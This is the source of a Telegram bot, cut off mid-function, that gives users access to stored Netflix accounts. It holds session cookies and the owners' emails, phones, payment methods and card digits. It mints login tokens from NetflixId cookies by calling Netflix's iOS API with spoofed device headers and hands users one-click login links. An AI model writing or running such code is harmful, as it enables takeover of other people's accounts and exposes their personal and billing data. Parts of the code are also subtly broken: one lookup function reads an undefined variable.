import sys
import asyncio
import json
import os
import re
import random
import string
import time
import ssl
import sqlite3
import threading
import zipfile
import shutil
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from dotenv import load_dotenv
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import traceback
from functools import wraps

import requests
import urllib3

# Suppress warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Fix asyncio loop
try:
    asyncio.get_running_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

ssl._create_default_https_context = ssl._create_unverified_context

# Try libsql
HAS_LIBSQL = False
try:
    import libsql_experimental as libsql
    HAS_LIBSQL = True
except ImportError:
    try:
        import libsql
        HAS_LIBSQL = True
    except ImportError:
        pass

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ChatMember, InputFile
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# ============================================================
# ENVIRONMENT VARIABLES
# ============================================================
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
TURSO_DATABASE_URL = os.getenv("TURSO_DATABASE_URL", "")
TURSO_AUTH_TOKEN = os.getenv("TURSO_AUTH_TOKEN", "")

admin_ids_str = os.getenv("ADMIN_IDS", "")
ADMIN_IDS = [int(aid.strip()) for aid in admin_ids_str.split(",") if aid.strip().isdigit()]

WORKING_COOLDOWN_MINUTES = int(os.getenv("COOLDOWN_MINUTES", 5))
MAX_ACCOUNTS_PER_USER = int(os.getenv("MAX_ACCOUNTS", 5))
MAX_CHECK_THREADS = int(os.getenv("MAX_THREADS", 20))
CHECK_TIMEOUT = int(os.getenv("CHECK_TIMEOUT", 20))
MAX_RETRIES = int(os.getenv("MAX_RETRIES", 3))

# ============================================================
# LOGGING - SILENT MODE (No errors in console)
# ============================================================
logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.ERROR
)
logger = logging.getLogger(__name__)

# ============================================================
# SAFE DATABASE CLASS - Auto Reconnect
# ============================================================
class SafeDatabase:
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialize()
        return cls._instance
    
    def _initialize(self):
        self.use_turso = HAS_LIBSQL and TURSO_DATABASE_URL and TURSO_DATABASE_URL.startswith("libsql://")
        self.conn = None
        self._connect()
        self._init_tables()
    
    def _connect(self):
        try:
            if self.use_turso and TURSO_DATABASE_URL:
                if TURSO_AUTH_TOKEN:
                    self.conn = libsql.connect(TURSO_DATABASE_URL, auth_token=TURSO_AUTH_TOKEN)
                else:
                    self.conn = libsql.connect(TURSO_DATABASE_URL)
            else:
                self.conn = sqlite3.connect("bot.db", check_same_thread=False)
        except Exception:
            self.conn = sqlite3.connect("bot.db", check_same_thread=False)
    
    def _ensure_connection(self):
        try:
            self.conn.execute("SELECT 1")
        except Exception:
            self._connect()
    
    def _init_tables(self):
        cur = self.conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_banned BOOLEAN DEFAULT 0,
                is_admin BOOLEAN DEFAULT 0,
                last_account_time TIMESTAMP,
                total_working INT DEFAULT 0,
                total_notworking INT DEFAULT 0,
                working_reports INT DEFAULT 0,
                notworking_reports INT DEFAULT 0,
                accounts_used INT DEFAULT 0,
                pending_report BOOLEAN DEFAULT 0,
                pending_report_account_id INTEGER,
                pending_report_type TEXT
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT,
                country TEXT,
                plan TEXT,
                cookies TEXT,
                nftoken TEXT,
                nftoken_expiry TEXT,
                assigned_to INTEGER,
                assigned_at TIMESTAMP,
                is_working BOOLEAN DEFAULT 1,
                status TEXT DEFAULT 'available',
                source_file TEXT,
                uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_checked TIMESTAMP,
                report_count INT DEFAULT 0,
                account_name TEXT,
                streams INT,
                quality TEXT,
                price TEXT,
                billing_date TEXT,
                member_since TEXT,
                payment_method TEXT,
                card_last4 TEXT,
                phone TEXT,
                extra_member BOOLEAN DEFAULT 0,
                membership_status TEXT,
                email_verified BOOLEAN DEFAULT 0,
                profiles TEXT,
                user_guid TEXT
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS reports (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                account_id INTEGER,
                report_type TEXT,
                screenshot_file_id TEXT,
                status TEXT DEFAULT 'pending',
                reported_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                reviewed_at TIMESTAMP,
                admin_note TEXT,
                admin_id INTEGER
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                message TEXT,
                admin_reply TEXT,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                replied_at TIMESTAMP
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS channels (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                channel_id TEXT UNIQUE,
                channel_name TEXT,
                invite_link TEXT,
                is_active BOOLEAN DEFAULT 1
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS stock_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                admin_id INTEGER,
                file_name TEXT,
                total_found INT,
                valid_found INT,
                uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                date DATE UNIQUE,
                total_hits INT DEFAULT 0,
                total_free INT DEFAULT 0,
                total_bad INT DEFAULT 0
            )
        ''')
        self.conn.commit()
    
    def execute(self, query, params=None):
        self._ensure_connection()
        cur = self.conn.cursor()
        if params:
            cur.execute(query, params)
        else:
            cur.execute(query)
        return cur
    
    def executemany(self, query, params_list):
        self._ensure_connection()
        cur = self.conn.cursor()
        cur.executemany(query, params_list)
        return cur
    
    def commit(self):
        self._ensure_connection()
        self.conn.commit()
    
    def close(self):
        self.conn.close()

db = SafeDatabase()

# ============================================================
# SAFE HELPERS - No None/Key Errors
# ============================================================

def safe_get(data: Any, key: str, default: Any = None) -> Any:
    """Safely get value from dict or return default."""
    if isinstance(data, dict):
        return data.get(key, default)
    return default

def safe_str(value: Any, default: str = "Unknown") -> str:
    """Safely convert to string."""
    if value is None:
        return default
    return str(value).strip() or default

def safe_int(value: Any, default: int = 0) -> int:
    """Safely convert to int."""
    try:
        return int(value)
    except (ValueError, TypeError):
        return default

def safe_bool(value: Any) -> bool:
    """Safely convert to bool."""
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return bool(value)
    if isinstance(value, str):
        return value.lower() in ("true", "yes", "1", "on")
    return False

# ============================================================
# NFToken Generator - Safe with Retry
# ============================================================
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

def generate_nftoken_safe(netflix_id: str, attempts: int = 3) -> Tuple[Optional[str], Optional[str]]:
    """Safe NFToken generation with retry - NEVER crashes."""
    if not netflix_id:
        return None, None
    
    for attempt in range(attempts):
        try:
            headers = dict(NFTOKEN_HEADERS)
            headers["Cookie"] = f"NetflixId={netflix_id}"
            headers["x-netflix.request.attempt"] = str(attempt + 1)
            
            response = requests.get(
                NFTOKEN_API_URL,
                params=NFTOKEN_QUERY_PARAMS,
                headers=headers,
                timeout=30,
                verify=False
            )
            
            if response.status_code == 200:
                data = response.json()
                token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
                token = token_data.get("token")
                expires = token_data.get("expires")
                if token:
                    return token, expires
            
            time.sleep(0.5)
            
        except Exception:
            time.sleep(0.5)
    
    return None, None

# ============================================================
# DATABASE HELPERS - ALL SAFE
# ============================================================

def get_user_safe(user_id: int) -> Dict:
    """Safely get user, never returns None."""
    try:
        cur = db.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        row = cur.fetchone()
        if row:
            return {
                "user_id": row[0], "username": safe_str(row[1]), "first_name": safe_str(row[2]),
                "joined_at": safe_str(row[3]), "is_banned": safe_bool(row[4]), "is_admin": safe_bool(row[5]),
                "last_account_time": safe_str(row[6]), "total_working": safe_int(row[7]),
                "total_notworking": safe_int(row[8]), "working_reports": safe_int(row[9]),
                "notworking_reports": safe_int(row[10]), "accounts_used": safe_int(row[11]),
                "pending_report": safe_bool(row[12]), "pending_report_account_id": safe_int(row[13]),
                "pending_report_type": safe_str(row[14]),
            }
    except Exception:
        pass
    return {
        "user_id": user_id, "username": "", "first_name": "",
        "joined_at": "", "is_banned": False, "is_admin": False,
        "last_account_time": "", "total_working": 0, "total_notworking": 0,
        "working_reports": 0, "notworking_reports": 0, "accounts_used": 0,
        "pending_report": False, "pending_report_account_id": 0,
        "pending_report_type": "",
    }

def create_user_safe(user_id: int, username: str, first_name: str):
    """Safely create user, ignore errors."""
    try:
        is_admin = 1 if user_id in ADMIN_IDS else 0
        db.execute('''
            INSERT OR IGNORE INTO users (user_id, username, first_name, is_admin, pending_report)
            VALUES (?, ?, ?, ?, 0)
        ''', (user_id, safe_str(username), safe_str(first_name), is_admin))
        db.commit()
    except Exception:
        pass

def get_available_accounts_safe() -> List[Dict]:
    """Safely get accounts, never crashes."""
    try:
        cur = db.execute('''
            SELECT id, email, country, plan, cookies, nftoken, nftoken_expiry, status,
                   account_name, streams, quality, price, billing_date, member_since,
                   payment_method, card_last4, phone, extra_member, profiles, user_guid
            FROM accounts WHERE status = 'available' AND is_working = 1 ORDER BY id ASC
        ''')
        rows = cur.fetchall()
        return [
            {
                "id": r[0], "email": safe_str(r[1]), "country": safe_str(r[2]), "plan": safe_str(r[3]),
                "cookies": safe_str(r[4]), "nftoken": safe_str(r[5]), "nftoken_expiry": safe_str(r[6]),
                "status": safe_str(r[7]), "account_name": safe_str(r[8]), "streams": safe_int(r[9]),
                "quality": safe_str(r[10]), "price": safe_str(r[11]), "billing_date": safe_str(r[12]),
                "member_since": safe_str(r[13]), "payment_method": safe_str(r[14]),
                "card_last4": safe_str(r[15]), "phone": safe_str(r[16]), "extra_member": safe_bool(r[17]),
                "profiles": safe_str(r[18]), "user_guid": safe_str(r[19]),
            }
            for r in rows
        ]
    except Exception:
        return []

def get_total_accounts_safe() -> Dict:
    """Safely get total accounts."""
    try:
        cur = db.execute('SELECT COUNT(*) FROM accounts WHERE status = "available" AND is_working = 1')
        total = cur.fetchone()[0] or 0
        cur = db.execute('SELECT plan, COUNT(*) FROM accounts WHERE status = "available" AND is_working = 1 GROUP BY plan')
        plan_counts = {safe_str(r[0]): safe_int(r[1]) for r in cur.fetchall()}
        return {"total": total, "plans": plan_counts}
    except Exception:
        return {"total": 0, "plans": {}}

def assign_account_safe(user_id: int) -> Optional[Dict]:
    """Safely assign account to user."""
    try:
        accounts = get_available_accounts_safe()
        if not accounts:
            return None
        
        account = accounts[0]
        db.execute('UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = "available" WHERE assigned_to = ?', (user_id,))
        cur = db.execute('''
            UPDATE accounts 
            SET assigned_to = ?, assigned_at = CURRENT_TIMESTAMP, status = 'assigned' 
            WHERE id = ? AND status = 'available'
        ''', (user_id, account["id"]))
        
        if cur.rowcount > 0:
            db.execute('''
                UPDATE users 
                SET last_account_time = CURRENT_TIMESTAMP, accounts_used = accounts_used + 1
                WHERE user_id = ?
            ''', (user_id,))
            db.commit()
            return account
        db.commit()
        return None
    except Exception:
        return None

def get_assigned_account_safe(user_id: int) -> Optional[Dict]:
    """Safely get assigned account."""
    try:
        cur = db.execute('''
            SELECT id, email, country, plan, cookies, nftoken, nftoken_expiry,
                   account_name, streams, quality, price, billing_date, member_since,
                   payment_method, card_last4, phone, extra_member, profiles, user_guid
            FROM accounts WHERE assigned_to = ? AND status = 'assigned' ORDER BY assigned_at DESC LIMIT 1
        ''', (user_id,))
        row = cur.fetchone()
        if row:
            return {
                "id": r[0], "email": safe_str(r[1]), "country": safe_str(r[2]), "plan": safe_str(r[3]),
                "cookies": safe_str(r[4]), "nftoken": safe_str(r[5]), "nftoken_expiry": safe_str(r[6]),
                "account_name": safe_str(r[7]), "streams": safe_int(r[8]), "quality": safe_str(r[9]),
                "price": safe_str(r[10]), "billing_date": safe_str(r[11]), "member_since": safe_str(r[12]),
                "payment_method": safe_str(r[13]), "card_last4": safe_str(r[14]), "phone": safe_str(r[15]),
                "extra_member": safe_bool(r[16]), "profiles": safe_str(r[17]), "user_guid": safe_str(r[18]),
            }
    except Exception:
        pass
    return None

def release_account_safe(account_id: int):
    """Safely release account."""
    try:
        db.execute('UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = "available" WHERE id = ?', (account_id,))
        db.commit()
    except Exception:
        pass

def can_get_account_safe(user_id: int) -> Tuple[bool, str]:
    """Safely check if user can get account."""
    user = get_user_safe(user_id)
    if safe_bool(user.get("is_banned")):
        return False, "🚫 You are banned from using this bot."
    
    last_time = user.get("last_account_time")
    if last_time:
        try:
            last_dt = datetime.strptime(str(last_time), "%Y-%m-%d %H:%M:%S")
            diff = datetime.utcnow() - last_dt
            cooldown_seconds = WORKING_COOLDOWN_MINUTES * 60
            if diff.total_seconds() < cooldown_seconds:
                remaining = int((cooldown_seconds - diff.total_seconds()) / 60) + 1
                return False, f"⏳ Please wait {remaining} minute(s)."
        except Exception:
            pass
    
    if safe_int(user.get("accounts_used")) >= MAX_ACCOUNTS_PER_USER:
        return False, f"⚠️ Max {MAX_ACCOUNTS_PER_USER} accounts per user."
    return True, ""

def save_account_batch_safe(accounts: List[Dict]) -> int:
    """Safely save accounts in batch."""
    if not accounts:
        return 0
    try:
        query = '''
            INSERT INTO accounts (
                email, country, plan, cookies, nftoken, nftoken_expiry,
                source_file, last_checked, account_name, streams, quality,
                price, billing_date, member_since, payment_method, card_last4,
                phone, extra_member, membership_status, email_verified,
                profiles, user_guid
            ) VALUES (?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        '''
        params_list = [
            (
                safe_str(a.get("email")), safe_str(a.get("country")), safe_str(a.get("plan")),
                safe_str(a.get("cookies")), safe_str(a.get("nftoken")), safe_str(a.get("nftoken_expiry")),
                safe_str(a.get("source_file")), safe_str(a.get("account_name")), safe_int(a.get("streams")),
                safe_str(a.get("quality")), safe_str(a.get("price")), safe_str(a.get("billing_date")),
                safe_str(a.get("member_since")), safe_str(a.get("payment_method")), safe_str(a.get("card_last4")),
                safe_str(a.get("phone")), 1 if safe_bool(a.get("extra_member")) else 0,
                safe_str(a.get("membership_status")), 1 if safe_bool(a.get("email_verified")) else 0,
                safe_str(a.get("profiles")), safe_str(a.get("user_guid")),
            )
            for a in accounts
        ]
        cur = db.executemany(query, params_list)
        db.commit()
        return cur.rowcount
    except Exception:
        return 0

# ============================================================
# TELEGRAM BOT - SILENT ERROR HANDLING
# ============================================================

async def safe_send_message(chat_id: int, text: str, reply_markup=None, parse_mode=ParseMode.MARKDOWN, context=None):
    """Safely send message, never crashes."""
    try:
        if context and context.bot:
            await context.bot.send_message(
                chat_id=chat_id,
                text=text,
                reply_markup=reply_markup,
                parse_mode=parse_mode
            )
    except Exception:
        pass

def clean_channel_id(ch_id: str):
    if not ch_id:
        return None
    ch_id = ch_id.strip()
    if ch_id.startswith("-100") or ch_id.isdigit():
        try:
            return int(ch_id)
        except:
            return ch_id
    if ch_id.startswith("@"):
        return ch_id
    if "t.me/" in ch_id:
        username = ch_id.split("t.me/")[-1].strip("/")
        if username and not username.startswith("+"):
            return f"@{username}"
    return None

async def check_force_join_safe(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Safely check force join."""
    try:
        channels = get_channels_safe()
        channels = [c for c in channels if c.get("is_active")]
        if not channels:
            return True
        for channel in channels:
            target_id = clean_channel_id(channel.get("channel_id", ""))
            if not target_id:
                continue
            try:
                member = await context.bot.get_chat_member(target_id, user_id)
                if member.status in [ChatMember.LEFT, ChatMember.KICKED]:
                    return False
            except Exception:
                continue
    except Exception:
        pass
    return True

def get_channels_safe() -> List[Dict]:
    """Safely get channels."""
    try:
        cur = db.execute('SELECT id, channel_id, channel_name, invite_link, is_active FROM channels')
        rows = cur.fetchall()
        return [{"id": r[0], "channel_id": safe_str(r[1]), "channel_name": safe_str(r[2]), "invite_link": safe_str(r[3]), "is_active": safe_bool(r[4])} for r in rows]
    except Exception:
        return []

# ============================================================
# START - MAIN MENU
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        user_id = user.id
        
        # Check pending report
        user_data = get_user_safe(user_id)
        if safe_bool(user_data.get("pending_report")):
            pending_type = safe_str(user_data.get("pending_report_type"))
            await safe_send_message(user_id, 
                f"⚠️ **You have a pending report!**\n\n"
                f"Please upload a screenshot proof for your **{pending_type.upper()}** report.\n\n"
                f"📸 Send a screenshot image now.\n\n"
                f"👨‍💻 **Developer:** @Senzo268",
                context=context
            )
            return
        
        create_user_safe(user_id, safe_str(user.username), safe_str(user.first_name))
        
        if safe_bool(user_data.get("is_banned")):
            await safe_send_message(user_id, "🚫 You are banned from using this bot.", context=context)
            return
        
        joined = await check_force_join_safe(user_id, context)
        if not joined:
            channels = get_channels_safe()
            channels = [c for c in channels if c.get("is_active")]
            keyboard = []
            for ch in channels:
                keyboard.append([InlineKeyboardButton(f"📢 Join {safe_str(ch.get('channel_name'))}", url=safe_str(ch.get('invite_link')))])
            keyboard.append([InlineKeyboardButton("✅ I've Joined", callback_data="check_join")])
            await safe_send_message(user_id,
                "🚨 **Please join our channels first!**\n\nYou must join all channels below to use this bot:",
                reply_markup=InlineKeyboardMarkup(keyboard),
                context=context
            )
            return
        
        stats = get_total_accounts_safe()
        plan_display = ""
        for plan, count in stats.get('plans', {}).items():
            emoji = {"PREMIUM": "👑", "STANDARD": "⭐", "BASIC": "🎯", "MOBILE": "📱", "FREE": "🆓"}.get(plan, "📦")
            plan_display += f"│ {emoji} {plan}: **{count}**\n"
        
        if not plan_display:
            plan_display = "│ No accounts available\n"
        
        assigned = get_assigned_account_safe(user_id)
        
        keyboard = [
            [InlineKeyboardButton("🎯 Get Account", callback_data="get_account")],
        ]
        if assigned:
            keyboard.append([
                InlineKeyboardButton("✅ Working", callback_data="working"),
                InlineKeyboardButton("❌ Not Working", callback_data="notworking"),
            ])
        keyboard.append([
            InlineKeyboardButton("📞 Contact Admin", callback_data="contact"),
            InlineKeyboardButton("📊 My Status", callback_data="my_status"),
        ])
        if safe_bool(user_data.get("is_admin")) or user_id in ADMIN_IDS:
            keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
        
        text = f"""
🌟 **WELCOME TO SENZO NETFLIX BOT** 🌟

━━━━━━━━━━━━━━━━━━━━━
👋 Hello **{safe_str(user.first_name)}**!
━━━━━━━━━━━━━━━━━━━━━

📊 **ACCOUNT STATUS**
┌─────────────────────
│ 📦 Total Available: **{safe_int(stats.get('total'))}**
{plan_display}└─────────────────────

⚙️ **YOUR STATS**
┌─────────────────────
│ ✅ Working Reports: **{safe_int(user_data.get('working_reports'))}**
│ ❌ Not Working: **{safe_int(user_data.get('notworking_reports'))}**
│ 📦 Accounts Used: **{safe_int(user_data.get('accounts_used'))}/{MAX_ACCOUNTS_PER_USER}**
└─────────────────────

⏳ Cooldown: **{WORKING_COOLDOWN_MINUTES} min**

━━━━━━━━━━━━━━━━━━━━━
🔽 **SELECT AN OPTION BELOW**
"""
        text += "\n\n👨‍💻 **Developer:** @Senzo268"
        
        await safe_send_message(user_id, text, reply_markup=InlineKeyboardMarkup(keyboard), context=context)
        
    except Exception:
        pass

# ============================================================
# GET ACCOUNT
# ============================================================

async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        user_data = get_user_safe(user_id)
        if safe_bool(user_data.get("is_banned")):
            await safe_send_message(user_id, "🚫 You are banned.", context=context)
            return
        
        can_get, msg = can_get_account_safe(user_id)
        if not can_get:
            await safe_send_message(user_id, msg, context=context)
            return
        
        joined = await check_force_join_safe(user_id, context)
        if not joined:
            await safe_send_message(user_id, "⚠️ Please join all required channels first! Use /start", context=context)
            return
        
        account = assign_account_safe(user_id)
        if not account:
            await safe_send_message(user_id, "❌ No accounts available right now. Please try again later!", context=context)
            return
        
        cookie_full = safe_str(account.get('cookies', 'No cookies available'))
        if len(cookie_full) > 3900:
            cookie_display = cookie_full[:3900] + "\n\n... (cookie truncated due to length)"
        else:
            cookie_display = cookie_full
        
        text = f"""
🎉 **ACCOUNT ASSIGNED!**

━━━━━━━━━━━━━━━━━━━━━
📧 **Email:** `{safe_str(account.get('email'))}`
👤 **Name:** {safe_str(account.get('account_name'))}
📱 **Phone:** {safe_str(account.get('phone'), 'Not provided')}
🌍 **Country:** {safe_str(account.get('country'))}
📦 **Plan:** {safe_str(account.get('plan'))}
🛡️ **Status:** {safe_str(account.get('membership_status'), 'Unknown')}
📺 **Streams:** {safe_int(account.get('streams'))}
🎞️ **Quality:** {safe_str(account.get('quality'))}
💰 **Price:** {safe_str(account.get('price'), 'N/A')}
🗓️ **Billing:** {safe_str(account.get('billing_date'))}
👥 **Extra Member:** {'✅ Yes' if safe_bool(account.get('extra_member')) else '❌ No'}
🎭 **Profiles:** {safe_str(account.get('profiles'), 'None')}
🆔 **GUID:** `{safe_str(account.get('user_guid'))}`
━━━━━━━━━━━━━━━━━━━━━

🍪 **Cookie:**
`{cookie_display}`

━━━━━━━━━━━━━━━━━━━━━

📝 **INSTRUCTIONS:**
1️⃣ Click a login link below
2️⃣ Test the account
3️⃣ **IMPORTANT:** After testing, click Working or Not Working
   and upload a screenshot as proof
"""
        
        keyboard = []
        token = safe_str(account.get('nftoken'))
        
        if token and len(token) > 10:
            keyboard.append([
                InlineKeyboardButton("📱 Phone Login", url=f"https://netflix.com/unsupported?nftoken={token}"),
                InlineKeyboardButton("🖥️ PC Login", url=f"https://netflix.com/login?nftoken={token}")
            ])
            keyboard.append([
                InlineKeyboardButton("📺 TV Login", url=f"https://netflix.com/tv8?nftoken={token}")
            ])
            if safe_str(account.get('nftoken_expiry')):
                text += f"\n⏳ NFToken expires: `{safe_str(account.get('nftoken_expiry'))}`"
        else:
            keyboard.append([
                InlineKeyboardButton("📱 Phone Login", url="https://netflix.com/unsupported"),
                InlineKeyboardButton("🖥️ PC Login", url="https://netflix.com/login")
            ])
            keyboard.append([
                InlineKeyboardButton("📺 TV Login", url="https://netflix.com/tv8")
            ])
            text += "\n\n💡 **Use the cookie above** with a cookie editor extension to login."
        
        text += "\n\n✅ **After testing, report below:**"
        keyboard.append([
            InlineKeyboardButton("✅ Working", callback_data=f"report_working_{account['id']}"),
            InlineKeyboardButton("❌ Not Working", callback_data=f"report_notworking_{account['id']}")
        ])
        keyboard.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")])
        
        text += "\n\n👨‍💻 **Developer:** @Senzo268"
        
        await query.edit_message_text(
            text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.MARKDOWN,
        )
        
    except Exception:
        pass

# ============================================================
# WORKING / NOT WORKING
# ============================================================

async def working_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        user_data = get_user_safe(user_id)
        if safe_bool(user_data.get("pending_report")):
            await safe_send_message(user_id, "⚠️ You have a pending report! Upload screenshot first.", context=context)
            return
        
        assigned = get_assigned_account_safe(user_id)
        if not assigned:
            await safe_send_message(user_id, "⚠️ No active account! Click 'Get Account' first.", context=context)
            return
        
        # Set pending report
        try:
            db.execute('''
                UPDATE users 
                SET pending_report = 1, pending_report_account_id = ?, pending_report_type = 'working'
                WHERE user_id = ?
            ''', (assigned["id"], user_id))
            db.commit()
        except Exception:
            pass
        
        await query.edit_message_text(
            "✅ **Report: WORKING**\n\n"
            "📸 **Please upload a screenshot proof** for this report.\n\n"
            "⚠️ **You must upload a screenshot before you can do anything else!**\n\n"
            "Send a screenshot image now.\n\n👨‍💻 **Developer:** @Senzo268",
            parse_mode=ParseMode.MARKDOWN,
        )
    except Exception:
        pass

async def notworking_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        user_data = get_user_safe(user_id)
        if safe_bool(user_data.get("pending_report")):
            await safe_send_message(user_id, "⚠️ You have a pending report! Upload screenshot first.", context=context)
            return
        
        assigned = get_assigned_account_safe(user_id)
        if not assigned:
            await safe_send_message(user_id, "⚠️ No active account! Click 'Get Account' first.", context=context)
            return
        
        try:
            db.execute('''
                UPDATE users 
                SET pending_report = 1, pending_report_account_id = ?, pending_report_type = 'notworking'
                WHERE user_id = ?
            ''', (assigned["id"], user_id))
            db.commit()
        except Exception:
            pass
        
        await query.edit_message_text(
            "❌ **Report: NOT WORKING**\n\n"
            "📸 **Please upload a screenshot proof** for this report.\n\n"
            "⚠️ **You must upload a screenshot before you can do anything else!**\n\n"
            "Send a screenshot image now.\n\n👨‍💻 **Developer:** @Senzo268",
            parse_mode=ParseMode.MARKDOWN,
        )
    except Exception:
        pass

# ============================================================
# HANDLE SCREENSHOT
# ============================================================

async def handle_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        user_data = get_user_safe(user_id)
        
        if not safe_bool(user_data.get("pending_report")):
            await safe_send_message(user_id, "❌ You don't have any pending report.\n\nUse the menu buttons to report an account first.", context=context)
            return
        
        photo = update.message.photo
        if not photo:
            await safe_send_message(user_id, "❌ Please upload an **image/screenshot**.", context=context)
            return
        
        account_id = safe_int(user_data.get("pending_report_account_id"))
        report_type = safe_str(user_data.get("pending_report_type"))
